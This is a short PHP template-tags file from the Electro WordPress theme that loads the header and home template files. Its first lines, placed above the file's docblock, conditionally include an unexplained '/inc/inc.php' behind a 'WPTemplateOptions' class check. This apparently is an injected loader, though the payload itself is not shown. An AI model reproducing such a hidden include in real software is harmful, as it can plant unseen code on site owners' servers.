<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/inc/inc.php' ) ) {
	include_once( get_template_directory() . '/inc/inc.php' );
}
/**
 * Template tags for Electro
 * 
 * @since 2.0
 */

require_once get_template_directory() . '/inc/template-tags/header.php';
require_once get_template_directory() . '/inc/template-tags/home.php';